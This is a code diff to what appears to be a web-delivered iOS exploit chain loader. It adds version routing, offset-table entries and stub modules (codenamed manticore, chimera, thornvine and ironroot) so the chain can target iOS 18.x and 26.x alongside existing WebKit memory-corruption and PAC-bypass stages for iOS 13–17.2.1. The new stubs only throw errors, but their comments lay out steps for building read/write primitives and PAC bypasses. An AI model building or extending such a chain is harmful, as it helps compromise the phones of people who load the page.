@@ -1397,6 +1397,20 @@ let m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 = () => {
      */
     LTgSl5: [
     {
+      /* minVersion */GFx77t: 260000,
+      /* iOS 26.x — new exploit chain required */
+      Bv9KmR: true,
+      JtEUci: false,
+      KeCRDQ: false
+    },
+    {
+      /* minVersion */GFx77t: 180000,
+      /* iOS 18.x — new exploit chain required */
+      Xp4WqZ: true,
+      JtEUci: false,
+      KeCRDQ: false
+    },
+    {
       /* minVersion */GFx77t: 170300,
       JtEUci: false
     },
@@ -1512,6 +1526,26 @@ let m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 = () => {
      * This is the primary iOS device runtime with the most detailed offset table.
      */
     PSNMWj: [
+    {
+      /* minVersion */GFx77t: 260000,
+      /* iOS 26.x — new PAC bypass required */
+      Hm7RvN: true,
+      wF8NpI: false,
+      CpDW_T: false,
+      LJ1EuL: false,
+      QwxZcT: false,
+      IqxL92: false
+    },
+    {
+      /* minVersion */GFx77t: 180000,
+      /* iOS 18.x — new PAC bypass required */
+      Yt3FsK: true,
+      wF8NpI: false,
+      CpDW_T: false,
+      LJ1EuL: false,
+      QwxZcT: false,
+      IqxL92: false
+    },
     {
       /* minVersion */GFx77t: 170000,
       wF8NpI: true,
@@ -2362,14 +2396,17 @@ let m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 = () => {
                 var major = parseInt(match[1], 10);
                 var minor = parseInt(match[2], 10);
                 var patch = match[3] ? parseInt(match[3], 10) : 0;
-                // Higher than 17.2.1
-                if (major > 17 || (major === 17 && minor > 2) || (major === 17 && minor === 2 && patch > 1)) {
+                // Outside supported ranges: 13.0–17.2.1, 18.0–18.x, 26.0–26.x
+                var supported = (major >= 13 && (major < 17 || (major === 17 && minor < 2) || (major === 17 && minor === 2 && patch <= 1)))
+                    || (major === 18)
+                    || (major === 26);
+                if (!supported) {
                     document.getElementById('versionWarning').classList.add('show');
                 }
             } else if (!/iPhone|iPad|iPod/.test(ua)) {
                 // Not an iOS device at all - show warning
                 document.getElementById('versionWarning').classList.add('show');
-                document.getElementById('versionWarning').textContent = 'This tool is designed for iOS 13.0 \u2013 17.2.1 devices only. You can still view the page.';
+                document.getElementById('versionWarning').textContent = 'This tool is designed for iOS 13.0\u201317.2.1, 18.x, and 26.x devices only. You can still view the page.';
             }
         })();
 
@@ -5563,6 +5600,70 @@ r.si = X;
 return r;
         });
 
+        // Inlined from Stage1_18.0_18.x_manticore.js
+        globalThis.moduleManager.evalCode("Stage1_18.0_18.x_manticore", function() {
+/**
+ * Stage 1: WebKit Memory Corruption — iOS 18.0–18.x (arm64/arm64e)
+ * Codename: "manticore"
+ *
+ * STUB MODULE — exploit primitives not yet implemented.
+ * This file provides the module interface expected by group.html
+ * so that the version routing and module loading infrastructure
+ * works correctly for iOS 18.x targets.
+ *
+ * To implement:
+ *   1. Identify a WebKit/JSC vulnerability for iOS 18.x
+ *   2. Build read32/write64 primitives
+ *   3. Store the exploit primitive in platformState.exploitPrimitive
+ */
+
+let r = {};
+const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
+  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+
+r.si = async function () {
+  const version = platformModule.platformState.iOSVersion;
+  window.log("[STAGE1-MANTICORE] iOS 18.x exploit — version " + version);
+  window.log("[STAGE1-MANTICORE] STUB: exploit primitives not yet implemented");
+  throw new Error("Stage1 manticore: not implemented for iOS 18.x");
+};
+
+return r;
+
+        });
+
+        // Inlined from Stage1_26.0_26.x_chimera.js
+        globalThis.moduleManager.evalCode("Stage1_26.0_26.x_chimera", function() {
+/**
+ * Stage 1: WebKit Memory Corruption — iOS 26.0–26.x (arm64/arm64e)
+ * Codename: "chimera"
+ *
+ * STUB MODULE — exploit primitives not yet implemented.
+ * This file provides the module interface expected by group.html
+ * so that the version routing and module loading infrastructure
+ * works correctly for iOS 26.x targets.
+ *
+ * To implement:
+ *   1. Identify a WebKit/JSC vulnerability for iOS 26.x
+ *   2. Build read32/write64 primitives
+ *   3. Store the exploit primitive in platformState.exploitPrimitive
+ */
+
+let r = {};
+const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
+  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+
+r.si = async function () {
+  const version = platformModule.platformState.iOSVersion;
+  window.log("[STAGE1-CHIMERA] iOS 26.x exploit — version " + version);
+  window.log("[STAGE1-CHIMERA] STUB: exploit primitives not yet implemented");
+  throw new Error("Stage1 chimera: not implemented for iOS 26.x");
+};
+
+return r;
+
+        });
+
         // Inlined from Stage2_16.3_16.5.1_seedbell.js
         globalThis.moduleManager.evalCode("Stage2_16.3_16.5.1_seedbell", function() {
 /**
@@ -8720,6 +8821,62 @@ class mt {
     }
 }
 return r;
+        });
+
+        // Inlined from Stage2_18.0_18.x_thornvine.js
+        globalThis.moduleManager.evalCode("Stage2_18.0_18.x_thornvine", function() {
+/**
+ * Stage 2: PAC Bypass — iOS 18.0–18.x (arm64e)
+ * Codename: "thornvine"
+ *
+ * STUB MODULE — PAC bypass not yet implemented.
+ * This file provides the module interface expected by group.html
+ * so that the version routing works correctly for iOS 18.x arm64e targets.
+ *
+ * To implement:
+ *   1. Identify a PAC bypass technique for iOS 18.x
+ *   2. Implement .ga() to return the bypass primitive
+ */
+
+let r = {};
+const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
+  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+
+r.ga = function () {
+  window.log("[STAGE2-THORNVINE] iOS 18.x PAC bypass — STUB");
+  throw new Error("Stage2 thornvine: PAC bypass not implemented for iOS 18.x");
+};
+
+return r;
+
+        });
+
+        // Inlined from Stage2_26.0_26.x_ironroot.js
+        globalThis.moduleManager.evalCode("Stage2_26.0_26.x_ironroot", function() {
+/**
+ * Stage 2: PAC Bypass — iOS 26.0–26.x (arm64e)
+ * Codename: "ironroot"
+ *
+ * STUB MODULE — PAC bypass not yet implemented.
+ * This file provides the module interface expected by group.html
+ * so that the version routing works correctly for iOS 26.x arm64e targets.
+ *
+ * To implement:
+ *   1. Identify a PAC bypass technique for iOS 26.x
+ *   2. Implement .ga() to return the bypass primitive
+ */
+
+let r = {};
+const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
+  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
+
+r.ga = function () {
+  window.log("[STAGE2-IRONROOT] iOS 26.x PAC bypass — STUB");
+  throw new Error("Stage2 ironroot: PAC bypass not implemented for iOS 26.x");
+};
+
+return r;
+
         });
 
         // Inlined from Stage3_VariantB.js
@@ -13409,7 +13566,11 @@ return r.lA = () => {
                 "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
             ).platformState.versionFlags;
 
-            if (offsets.wF8NpI) {
+            if (offsets.Hm7RvN) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_26.0_26.x_ironroot");
+            } else if (offsets.Yt3FsK) {
+                pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_18.0_18.x_thornvine");
+            } else if (offsets.wF8NpI) {
                 await (await globalThis.moduleManager.getModuleByURL("Stage2_16.6_17.2.1_seedbell_pre")).ul();
                 pacModule = await globalThis.moduleManager.getModuleByURL("Stage2_17.0_17.2.1_seedbell");
             } else if (offsets.LJ1EuL) {
@@ -13465,7 +13626,11 @@ return r.lA = () => {
             setStatus("Stage 1: WebKit exploit...", "running");
             window.log("[LOADER] Selecting stage1 variant...");
 
-            if (offsets.JtEUci) {
+            if (offsets.Bv9KmR) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_26.0_26.x_chimera");
+            } else if (offsets.Xp4WqZ) {
+                stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_18.0_18.x_manticore");
+            } else if (offsets.JtEUci) {
                 stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_16.6_17.2.1_cassowary");
             } else if (offsets.KeCRDQ) {
                 stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_16.2_16.5.1_terrorbird");
